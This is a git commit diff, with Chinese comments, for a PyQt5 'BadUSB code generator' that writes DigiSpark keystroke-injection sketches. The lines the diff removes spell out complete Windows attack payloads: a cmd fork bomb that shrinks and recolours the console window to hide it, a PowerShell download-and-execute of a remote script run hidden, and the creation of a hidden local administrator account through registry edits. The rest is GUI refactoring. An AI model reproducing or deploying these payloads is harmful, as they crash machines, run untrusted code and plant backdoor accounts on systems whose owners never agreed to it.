51c56b234237de1c59304f033a91603e0f4e68c3
Hast <Hast@ANDROID>
2020-12-23 08:39:10 +0800

    使用本地git库 同时修改主窗体逻辑文件

--- myMainWindow.py
+++ myMainWindow.py
@@ -1,15 +1,24 @@
 import sys
-from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QFontDialog, QPushButton
+from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QFontDialog, QPushButton, QStyleFactory
 from PyQt5.QtCore import pyqtSlot, Qt, QEvent, pyqtSignal
 from ui_mainwindow import Ui_MainWindow
 from myKeyDialog import QmyDialog
-from KEY import KeyShowdict, KeyInputdict
+from KEY import KeyShowdict, KeyInputdict, BadUSBCodes, DNDefine, ENDConst
 from DuckToDigi import Duckyspark_translator
 
 
-# TODO pywin32有两个要做的 一是预览代码 二是截获快捷键 比如win+e 。用pyhook方便一点
-# TODO qss里做一个奶白色的主题
-# TODO 不光是其它按钮的 define  还有这几个正常的按钮也是没有define的
+# TODO 一 pywin32扩展库有两个要做的
+# TODO    1是预览代码 我发现有个叫autogui的扩展
+# TODO    2是截获快捷键 比如win+e 。用pyhook方便一点
+# TODO 二 qss里做一个奶白色的主题
+# TODO 四 一个花里胡哨的功能 对话框的生成位置可以生成到主窗口的边缘 哪边距屏幕边缘远就靠在主窗口的哪边
+# TODO 六 textEdit的语法高亮 QSyntaxHighlighter
+
+# TODO 五 对话框中的 ctrl shift alt win 可以被按下 或者 对话框中所有的的按钮都可以被按下
+# TODO    反正放在缓冲区里 也很简单对吧
+# TODO 三 有优化的地方 按键处理 看一下 显示在textEdit的前一步 合成最终的input按键
+# TODO    可以使用 一 个函数 把所有的按键信号都链接过来 这样我们的三个窗口就只用一个合成函数了
+# TODO 这两步是一块的  define兼容那边可能有点问题 所有还是先把那个槽函数写出来 在考虑合并吧 槽函数选择特征值太憨
 
 
 class QmyMainWindow(QMainWindow):
@@ -21,16 +30,15 @@ class QmyMainWindow(QMainWindow):
         self.ui.setupUi(self)  # 构造UI界面
         self.setWindowTitle("BadUSB代码生成")  # 标题
         self.setWindowFlags(Qt.MSWindowsFixedSizeDialogHint)  # 更窄的边框
+        self.ui.le_ci.setPlaceholderText("Ctrl+Shift+A")  # 按键识别输入占位符
+        self.ui.le_ps.setPlaceholderText("echo HelloWorld")  # 打印字符串占位符
+        self.ui.le_ci.installEventFilter(self)  # 注册监控器 供le_ci获取按键
+        self._KeyBoardStatus = 0  # 按键状态
+        self._keystring = ""  # 用来传值的 发送给 组合框单击打印的
+        self._Definedconst = []
 
         self.sB_label = QLabel(self)  # 放在状态栏中的标签
         self.ui.statusBar.addPermanentWidget(self.sB_label)
-
-        self.ui.le_ci.installEventFilter(self)  # 注册监控器 供le_ci获取按键
-        self._KeyBoardStatus = 0  # 按键状态
-        self._keystring = ""  # 好多全局变量啊 用来传值的 发送给 组合框单击打印的
-
-        self.ui.le_ci.setPlaceholderText("Ctrl+Shift+A")  # 按键识别输入占位符
-        self.ui.le_ps.setPlaceholderText("echo HelloWorld")  # 打印字符串占位符
 
     def eventFilter(self, watched, event):
         if watched == self.ui.le_ci:  # 如果当前监测对象为
@@ -79,8 +87,8 @@ class QmyMainWindow(QMainWindow):
         """这个是 点击输入按钮"""
         self.__dialog = QmyDialog(self)  # 按键对话框
         self.__dialog.setAttribute(Qt.WA_DeleteOnClose)  # 对话框关闭时自动删除
-        self.__dialog.ButtonClick.connect(self.DialogInput)
-        self.__dialog.changeActionEnable.connect(self.do_setActLocateEnable)
+        self.__dialog.ButtonClick.connect(self.MainInput)
+        self.__dialog.changePBEnable.connect(self.do_setPBEnable)
         self.__dialog.show()
 
     @pyqtSlot()
@@ -103,19 +111,7 @@ class QmyMainWindow(QMainWindow):
             self.ui.le_ci.setEnabled(False)
         else:
             self.ui.le_ci.setEnabled(True)
-
-        if len(self._keystring) == 0 and num != 2:  # 如果编辑框为空 或者当前是第三
-            return
-
-        if num == 0:
-            mystring = "DigiKeyboard.sendKeyStroke(%s);\n" % self._keystring
-            self.ui.TextEdit.insertPlainText(mystring)
-        elif num == 1:
-            mystring = "DigiKeyboard.sendKeyPress(%s);\n" % self._keystring
-            self.ui.TextEdit.insertPlainText(mystring)
-        elif num == 2:
-            mystring = "DigiKeyboard.sendKeyPress(0);\n"
-            self.ui.TextEdit.insertPlainText(mystring)
+        # TODO 这里也是要有一个暂存区的
 
     @pyqtSlot(int)
     def on_cb_ci_ap_currentIndexChanged(self, index):
@@ -139,186 +135,86 @@ class QmyMainWindow(QMainWindow):
         digistr = Duckyspark_translator(duckystr)
         self.ui.TextEdit.setPlainText(digistr)
 
-    @pyqtSlot(str)
-    def DialogInput(self, Keystr):
-        self.ui.TextEdit.insertPlainText(Keystr)
-        # print(Keystr)
+    # TODO 我们先把对话框的那边的数值处理好 然后再来看一下的 编辑框
+    # TODO 我看到了在event那边的一个列表中 需要重新赋值 不过思路还是一样的
+    @pyqtSlot(list, int)
+    def MainInput(self, keylist, num):
+        if len(self._keystring) == 0 and num != 2:  # 如果编辑框为空 或者当前是第三
+            return
+
+        print("======================")
+        print(keylist)
+        print(num)
+        print("======================") # 接收成功
+
+        if num == 0:
+            mystring = "DigiKeyboard.sendKeyStroke(%s);\n" % self._keystring
+            self.ui.TextEdit.insertPlainText(mystring)
+        elif num == 1:
+            mystring = "DigiKeyboard.sendKeyPress(%s);\n" % self._keystring
+            self.ui.TextEdit.insertPlainText(mystring)
+        elif num == 2:
+            mystring = "DigiKeyboard.sendKeyPress(0);\n"
+            self.ui.TextEdit.insertPlainText(mystring)
+
+        for key in list(self._keystring.split(',')):
+            key = key.lstrip()
+            if key in DNDefine:
+                print("当前按键" + key + "已被头文件定义")
+                continue  # 如果这个按键在这个列表中就不 定义 了
+            else:
+                print("当前按键" + key + "未被头文件定义")
+                if ENDConst[key] not in self._Definedconst:
+                    print("当前按键" + key + "已被软件定义")
+                    # print("已禁用快捷代码组")
+                    # self.ui.qc_group.setEnabled(False)
+                    text = list(self.ui.TextEdit.toPlainText().split('\n'))
+                    pos = text.index("#include \"DigiKeyboard.h\"") + 1  # 这是一个列表 所以注意 加一之后的位置
+                    text.insert(pos, "#define %s %s" % (key, ENDConst[key]))  # 在指定位置插入define
+                    # print(text)
+                    self.ui.TextEdit.clear()
+                    self.ui.TextEdit.insertPlainText("\n".join(text))  # 给TextEdit刷新以下
+                    self._Definedconst.append(ENDConst[key])  # 添加到列表中 以判断是否重复定义
+                else:
+                    continue
 
     @pyqtSlot(bool)
-    def do_setActLocateEnable(self, enable):
+    def do_setPBEnable(self, enable):
         self.ui.pb_od.setEnabled(enable)
 
+    # =========快捷按钮 1234=================
     @pyqtSlot()
     def on_pb_qc1_clicked(self):
         self.ui.TextEdit.clear()
-        payload = """//This script opens up a Windows command prompt and makes it open up another instance of itself and so on until the machine can take it no more and either locks or crashes. Credits to BlackBoot.
-#include "DigiKeyboard.h"
-void setup()
-{
-}
-
-void loop()
-{
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  //Obfuscate the terminal
-  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("COLOR EF");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //Run the fork bomb
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for (;;)
-  {
-    /*Stops the digispark from running the scipt again*/
-  }
-}
-
-"""
+        self._Definedconst.clear()  # 清空这个统计之后就能继续使用defind的功能了
+        payload = BadUSBCodes[2]
         self.ui.TextEdit.insertPlainText(payload)
 
     @pyqtSlot()
     def on_pb_qc2_clicked(self):
         self.ui.TextEdit.clear()
-        payload = """//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
-#include "DigiKeyboard.h"
-void setup() {
-}
-
-void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client = new-object System.Net.WebClient");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
-  DigiKeyboard.delay(750);
-  //If the system hasn't been configured to run scripts, uncomment the lines bellow
-  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(750);
-  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
-  //DigiKeyboard.delay(750);
-  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(750);
-  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for (;;) {
-    /*empty*/
-  }
-
-}
-        
-"""
+        self._Definedconst.clear()
+        payload = BadUSBCodes[1]
         self.ui.TextEdit.insertPlainText(payload)
 
     @pyqtSlot()
     def on_pb_qc3_clicked(self):
         self.ui.TextEdit.clear()
-        payload = """//This DigiSpark script opens up the powershell and makes your computer speak out a message.
-#include "DigiKeyboard.h"
-void setup() {
-}
-
-void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000);
-  DigiKeyboard.print("Add-Type -AssemblyName System.speech");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  //Uncomment these lines to use a female voice
-  //DigiKeyboard.print("$speak.SelectVoice('Microsoft Zira Desktop')");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(500);
-  DigiKeyboard.print("$speak.Speak(\"Here's a joke. Why do Java programmers wear glasses? Because they can't C#.\")");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("exit");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
-  DigiKeyboard.sendKeyStroke(KEY_N);
-  for (;;) {
-    /*empty*/
-  }
-
-}
-        
-"""
+        self._Definedconst.clear()
+        payload = BadUSBCodes[3]
         self.ui.TextEdit.insertPlainText(payload)
 
     @pyqtSlot()
     def on_pb_qc4_clicked(self):
         self.ui.TextEdit.clear()
-        payload = """//This DigiSpark script creates new local user and adds it to "Administrators" group
-//Tested on Windows 10 with English(US) keyboard layout
-//Created by Michyus | Edited by Elshan
-#include "DigiKeyboard.h"
-void setup() {
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print(F("powershell $pass = ConvertTo-SecureString \"P@ssW0rD\" -AsPlainText -Force; New-LocalUser \"accName\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"accName\" "));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  /* I assumed user already have powershell - Try to hide the user account from the login screen*/
-  DigiKeyboard.print(F("powershell New-Item -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\'\" -Name \"SpecialAccounts\" "));
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print(F("powershell New-Item -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts'\" -Name \"UserList\" "));
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print(F("powershell New-ItemProperty -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\'\" -Name \"accName\" -Value \"0\"  -PropertyType DWORD "));
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  /* end hide user section */
-  DigiKeyboard.print("exit");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-}
-
-void loop() {
-}
-
-"""
-
+        self._Definedconst.clear()
+        payload = BadUSBCodes[0]
         self.ui.TextEdit.insertPlainText(payload)
+
 
 if __name__ == "__main__":  # 用于当前窗体测试
     app = QApplication(sys.argv)  # 创建GUI应用程序
     form = QmyMainWindow()  # 创建窗体
+    QApplication.setStyle(QStyleFactory.create("windowsvista"))
     form.show()
     sys.exit(app.exec_())
